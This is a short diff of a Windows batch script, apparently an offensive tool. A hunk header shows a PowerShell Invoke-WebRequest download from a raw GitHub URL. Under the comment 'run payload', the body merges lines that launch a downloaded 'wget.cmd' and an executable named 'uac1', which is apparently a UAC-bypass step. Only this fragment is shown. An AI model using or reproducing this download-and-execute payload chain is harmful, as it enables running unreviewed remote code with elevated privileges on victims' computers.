@@ -30,8 +30,8 @@ powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.
 
 
 @REM run payload
-powershell ./wget.cmd
-./uac1
+powershell ./wget.cmd; ./uac1
+
 @REM cd back into initial location
 cd "%INITIALPATH%"
 
